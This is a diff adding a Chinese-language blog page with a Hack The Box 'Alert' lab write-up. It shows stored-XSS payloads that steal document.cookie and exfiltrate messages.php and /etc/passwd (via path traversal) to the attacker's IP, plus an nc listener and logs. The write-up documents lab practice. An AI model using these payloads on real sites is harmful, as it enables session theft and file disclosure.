@@ -1,0 +1,843 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Dre4m">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Alertnmap扫一下，看到开放了22和80端口 访问一下  于是将该域添加到&#x2F;etc&#x2F;hosts ​echo &quot;10.10.11.44 alert.htb&quot; |sudo tee -a &#x2F;etc&#x2F;hosts​ 进入了一个markdown网页  用dirsearch扫出来&#x2F;messages.php​是个空白页， 和&#x2F;uploads&#x2F;​访问返回403 再用ff">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB_Alert">
+<meta property="og:url" content="http://example.com/post/alert-z1tfcsg.html">
+<meta property="og:site_name" content="Dre4m">
+<meta property="og:description" content="Alertnmap扫一下，看到开放了22和80端口 访问一下  于是将该域添加到&#x2F;etc&#x2F;hosts ​echo &quot;10.10.11.44 alert.htb&quot; |sudo tee -a &#x2F;etc&#x2F;hosts​ 进入了一个markdown网页  用dirsearch扫出来&#x2F;messages.php​是个空白页， 和&#x2F;uploads&#x2F;​访问返回403 再用ff">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325161928-ewoyelx.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325162450-l44l73b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325170506-9z2mk45.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325171537-35z6h0f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325172321-5xvhwoa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325173717-bwvpv42.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327171035-zi28y5r.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327171453-b11t61z.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327172232-9ctnd48.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328183414-7u0ye0z.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328183452-xsc9xkj.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328195148-7l1j6le.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328195211-lhgj38g.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328214757-bijjhpz.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330214212-zj9obyh.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215202-cjolve2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215431-rf0sv97.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250330215806-czq6bvu.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250408151006-enyol34.png">
+<meta property="article:published_time" content="2025-03-25T16:00:31.000Z">
+<meta property="article:modified_time" content="2025-04-08T15:12:11.000Z">
+<meta property="article:author" content="Dre4m">
+<meta property="article:tag" content="htb">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325161928-ewoyelx.png">
+  
+  
+  
+    <meta name="google-site-verification" content="gUNvx5GJIg9_H74I7HHir--7_INvPGWDD52oHPg_-4k" />
+  
+  <title>HTB_Alert - Dre4m</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"vklZyGJHIw3vHy3PTGM92QOy-gzGzoHsz","app_key":"uiPwluTg2cOzOaF4R6Ljpxw4","server_url":"https://vklzygjh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dre4mの摸鱼日记</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB_Alert"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-25 16:00" pubdate>
+          2025年3月25日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB_Alert</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Alert"><a href="#Alert" class="headerlink" title="Alert"></a>Alert</h1><p>nmap扫一下，看到开放了22和80端口</p>
+<p>访问一下</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325161928-ewoyelx.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>于是将该域添加到&#x2F;etc&#x2F;hosts</p>
+<p>​<code>echo &quot;10.10.11.44 alert.htb&quot; |sudo tee -a /etc/hosts</code>​</p>
+<p>进入了一个markdown网页</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325162450-l44l73b.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>用dirsearch扫出来<code>/messages.php</code>​是个空白页， 和<code>/uploads/</code>​访问返回403</p>
+<p>再用ffuf进行子域名的爆破，找一个很全的字典，当然，kali也有自带的子域名字典<code>locate dns | grep &quot;/usr/share&quot; | grep &quot;.txt&quot;</code>​</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325170506-9z2mk45.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>我用的是下载的<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">字典</a></p>
+<p>​<code>ffuf -w /home/dream/桌面/fuzzDicts-master/subdomainDicts/dic1.txt -u http://alert.htb -H &quot;Host:FUZZ.alert.htb&quot; -fw 20</code>​</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325171537-35z6h0f.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>我们把这个子域名加到&#x2F;etc&#x2F;host</p>
+<p>​<code>sudo sed -i &#39;/10.10.11.44 alert.htb/ s/$/ statistics.alert.htb/&#39; /etc/hosts</code>​</p>
+<p>然后访问<code>statistics.alert.htb</code>​</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325172321-5xvhwoa.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>可以在网上搜索一下有关markdown的漏洞，最有可能的就是xss</p>
+<p>那么就来试一下，创建一个markdown文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bin">&lt;script&gt;<br>   alert(1)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>提交后</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250325173717-bwvpv42.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后用burpsuite抓包一下</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327171035-zi28y5r.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>修改一下</p>
+<p>​<code>&lt;script src=&quot;http://监听设备的ip:3000/pwned.js&quot;&gt;&lt;/script&gt;</code>​</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327171453-b11t61z.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>开启监听</p>
+<p>​<code>nc -lvnp 3000</code>​</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250327172232-9ctnd48.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>看到监听成功,显示 HTML 注入和 XSS 有效</p>
+<p>接下来看看管理员是否可以点击练习消息中的链接</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328183414-7u0ye0z.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328183452-xsc9xkj.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>通过监听可以看到管理员点击了连接</p>
+<p>之后尝试获取cookie</p>
+<p>pwned.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">fetch(&quot;http://10.10.16.63:8000/?&quot;+btoa(document.cookie));<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328195148-7l1j6le.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>将pwned.js所在目录开启一个·python服务</p>
+<p>​<code>python3 -m http.server</code>​</p>
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328195211-lhgj38g.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>之后python服务器可以看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bin">10.10.11.44 - - [28/Mar/2025 19:57:03] &quot;GET /pwned.js HTTP/1.1&quot; 200 -<br>10.10.11.44 - - [28/Mar/2025 19:57:03] code 404, message File not found<br>10.10.11.44 - - [19/Mar/2025 18:43:29] &quot;GET /？ HTTP/1.1&quot; 404 -<br><br></code></pre></td></tr></table></figure>
+
+<p>第一个是获取脚本，第二个是从正在运行的脚本获取。没有 cookie，这意味着用户没有 cookie，或者它被标记为<code>http_only</code>​。</p>
+<p>因为之前访问时文件<code>messages.php</code>​返回的是空文件，那就让管理员点击，看会不会返回什么内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bin">&lt;script src=&quot;http://10.10.16.63:8000/pwned.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>将pwned.js内容修改为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://alert.htb/messages.php&#x27;</span>, <span class="hljs-literal">false</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">var</span> req2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.63:8000/?content=&#x27;</span> + <span class="hljs-title function_">btoa</span>(req.<span class="hljs-property">responseText</span>),<span class="hljs-literal">true</span>);<br>req2.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250328214757-bijjhpz.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>base64解码之后可以获得</p>
+<p>​<code>&lt;h1&gt;Messages&lt;/h1&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;messages.php?file=2024-03-10_15-48-34.txt&#39;&gt;2024-03-10_15-48-34.txt&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</code>​</p>
+<p>然后可以测试一下LFI攻击路径遍历</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://alert.htb/messages.php?file=../../../../../etc/passwd&#x27;</span>, <span class="hljs-literal">false</span>);<br>req.<span class="hljs-title function_">send</span>();<br><span class="hljs-keyword">var</span> req2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req2.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.63:8000/?content=&#x27;</span> + <span class="hljs-title function_">btoa</span>(req.<span class="hljs-property">responseText</span>),<span class="hljs-literal">true</span>);<br>req2.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure>
+
+<p>ok,带出成功可以进行路径遍历</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">python3 -m http.<span class="hljs-property">server</span><br><span class="hljs-title class_">Serving</span> <span class="hljs-variable constant_">HTTP</span> on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">8000</span> (<span class="hljs-attr">http</span>:<span class="hljs-comment">//0.0.0.0:8000/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.63</span> - - [<span class="hljs-number">30</span>/<span class="hljs-title class_">Mar</span>/<span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span>:<span class="hljs-number">16</span>] <span class="hljs-string">&quot;GET /pwned.js HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.63</span> - - [<span class="hljs-number">30</span>/<span class="hljs-title class_">Mar</span>/<span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span>:<span class="hljs-number">25</span>] <span class="hljs-string">&quot;GET /?content=Cg== HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.44</span> - - [<span class="hljs-number">30</span>/<span class="hljs-title class_">Mar</span>/<span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span>:<span class="hljs-number">45</span>] <span class="hljs-string">&quot;GET /pwned.js HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.44</span> - - [<span class="hljs-number">30</span>/<span class="hljs-title class_">Mar</span>/<span class="hljs-number">2025</span> <span class="hljs-number">20</span>:<span class="hljs-number">33</span>:<span class="hljs-number">47</span>] <span class="hljs-string">&quot;GET /?content=PHByZT5yb290Ong6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoCmRhZW1vbjp4OjE6MTpkYWVtb246L3Vzci9zYmluOi91c3Ivc2Jpbi9ub2xvZ2luCmJpbjp4OjI6MjpiaW46L2JpbjovdXNyL3NiaW4vbm9sb2dpbgpzeXM6eDozOjM6c3lzOi9kZXY6L3Vzci9zYmluL25vbG9naW4Kc3luYzp4OjQ6NjU1MzQ6c3luYzovYmluOi9iaW4vc3luYwpnYW1lczp4OjU6NjA6Z2FtZXM6L3Vzci9nYW1lczovdXNyL3NiaW4vbm9sb2dpbgptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovdXNyL3NiaW4vbm9sb2dpbgpscDp4Ojc6NzpscDovdmFyL3Nwb29sL2xwZDovdXNyL3NiaW4vbm9sb2dpbgptYWlsOng6ODo4Om1haWw6L3Zhci9tYWlsOi91c3Ivc2Jpbi9ub2xvZ2luCm5ld3M6eDo5Ojk6bmV3czovdmFyL3Nwb29sL25ld3M6L3Vzci9zYmluL25vbG9naW4KdXVjcDp4OjEwOjEwOnV1Y3A6L3Zhci9zcG9vbC91dWNwOi91c3Ivc2Jpbi9ub2xvZ2luCnByb3h5Ong6MTM6MTM6cHJveHk6L2JpbjovdXNyL3NiaW4vbm9sb2dpbgp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi91c3Ivc2Jpbi9ub2xvZ2luCmJhY2t1cDp4OjM0OjM0OmJhY2t1cDovdmFyL2JhY2t1cHM6L3Vzci9zYmluL25vbG9naW4KbGlzdDp4OjM4OjM4Ok1haWxpbmcgTGlzdCBNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpbgppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1uZXR3b3JrOng6MTAwOjEwMjpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6MTAxOjEwMzpzeXN0ZW1kIFJlc29sdmVyLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTAyOjEwNDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAzOjEwNjo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwNDoxMTA6Oi9ob21lL3N5c2xvZzovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA1OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KdHNzOng6MTA2OjExMTpUUE0gc29mdHdhcmUgc3RhY2ssLCw6L3Zhci9saWIvdHBtOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDc6MTEyOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCnRjcGR1bXA6eDoxMDg6MTEzOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbGFuZHNjYXBlOng6MTA5OjExNTo6L3Zhci9saWIvbGFuZHNjYXBlOi91c3Ivc2Jpbi9ub2xvZ2luCnBvbGxpbmF0ZTp4OjExMDoxOjovdmFyL2NhY2hlL3BvbGxpbmF0ZTovYmluL2ZhbHNlCmZ3dXBkLXJlZnJlc2g6eDoxMTE6MTE2OmZ3dXBkLXJlZnJlc2ggdXNlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KdXNibXV4Ong6MTEyOjQ2OnVzYm11eCBkYWVtb24sLCw6L3Zhci9saWIvdXNibXV4Oi91c3Ivc2Jpbi9ub2xvZ2luCnNzaGQ6eDoxMTM6NjU1MzQ6Oi9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk5Ojk5OTpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KYWxiZXJ0Ong6MTAwMDoxMDAwOmFsYmVydDovaG9tZS9hbGJlcnQ6L2Jpbi9iYXNoCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCmRhdmlkOng6MTAwMToxMDAyOiwsLDovaG9tZS9kYXZpZDovYmluL2Jhc2gKPC9wcmU+Cg== HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure>
+
+<p>解码一下得到</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="hljs-attr">root</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-attr">root</span>:<span class="hljs-regexp">/root:/</span>bin/bash<br><span class="hljs-attr">daemon</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-attr">daemon</span>:<span class="hljs-regexp">/usr/</span><span class="hljs-attr">sbin</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">bin</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-attr">bin</span>:<span class="hljs-regexp">/bin:/u</span>sr/sbin/nologin<br><span class="hljs-attr">sys</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-attr">sys</span>:<span class="hljs-regexp">/dev:/u</span>sr/sbin/nologin<br><span class="hljs-attr">sync</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:<span class="hljs-attr">sync</span>:<span class="hljs-regexp">/bin:/</span>bin/sync<br><span class="hljs-attr">games</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">5</span>:<span class="hljs-number">60</span>:<span class="hljs-attr">games</span>:<span class="hljs-regexp">/usr/g</span><span class="hljs-attr">ames</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">man</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-attr">man</span>:<span class="hljs-regexp">/var/</span>cache/<span class="hljs-attr">man</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span class="hljs-attr">lp</span>:<span class="hljs-attr">x</span>:<span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-attr">lp</span>:<span class="hljs-regexp">/var/</span>spool/<span class="hljs-attr">lpd</span>:<span class="hljs-regexp">/usr/</span>sbin/nologin<br><span 